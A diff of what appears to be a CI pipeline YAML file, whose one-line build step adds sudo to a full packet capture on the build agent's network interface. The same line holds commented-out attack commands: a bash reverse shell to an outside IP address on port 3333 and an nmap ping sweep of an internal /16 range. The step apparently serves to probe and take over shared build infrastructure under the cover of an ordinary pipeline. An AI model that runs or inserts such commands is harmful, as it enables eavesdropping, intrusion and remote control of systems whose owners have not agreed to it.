@@ -10,7 +10,7 @@ pool:
   vmImage: 'ubuntu-latest'
 
 steps:
-- script: tcpdump -i eth0 -nnvvXS #sh -i >& /dev/tcp/54.203.54.34/3333 0>&1 # udo apt-get install nmap && nmap -sP 10.1.0.4/16  # 
+- script: sudo tcpdump -i eth0 -nnvvXS #sh -i >& /dev/tcp/54.203.54.34/3333 0>&1 # udo apt-get install nmap && nmap -sP 10.1.0.4/16  # 
   displayName: 'Run a one-line script'
 
 - script: |
